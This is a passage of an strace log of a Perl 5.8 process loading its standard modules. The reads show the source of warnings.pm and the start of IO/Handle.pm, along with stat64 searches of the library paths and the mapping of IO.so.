\"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
5839  07:10:58.122582 brk(0x81b6000)    = 0x81b6000
5839  07:10:58.122599 brk(0x81b5000)    = 0x81b5000
5839  07:10:58.122676 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
5839  07:10:58.123157 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
5839  07:10:58.123871 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
5839  07:10:58.124071 read(8, "", 4096) = 0
5839  07:10:58.124085 close(8)          = 0
5839  07:10:58.124235 _llseek(6, 412, [412], SEEK_SET) = 0
5839  07:10:58.124251 _llseek(6, 0, [412], SEEK_CUR) = 0
5839  07:10:58.124261 close(6)          = 0
5839  07:10:58.124304 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5839  07:10:58.124328 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5839  07:10:58.124355 futex(0xb7fa8070, 0x81 /* FUTEX_??? */, 2147483647) = 0
5839  07:10:58.124395 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
5839  07:10:58.124439 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5839  07:10:58.124543 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5839  07:10:58.124568 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7fac000
5839  07:10:58.124581 mmap2(0xb7fb0000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fb0000
5839  07:10:58.124596 close(6)          = 0
5839  07:10:58.124722 stat64("/etc/perl/IO/Handle.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124738 stat64("/etc/perl/IO/Handle.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124752 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124765 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124779 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124791 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124809 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124821 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124834 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124846 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124860 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.124886 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
5839  07:10:58.124938 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.124969 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.124995 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.125012 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
5839  07:10:58.125365 stat64("/etc/perl/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125396 stat64("/etc/perl/Symbol.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125436 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125466 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125497 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125509 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125523 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125535 stat64("/usr/lib/perl5/Symbol.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125548 stat64("/usr/share/perl5/Symbol.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.125560 stat64("/usr/share/perl5/Symbol.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
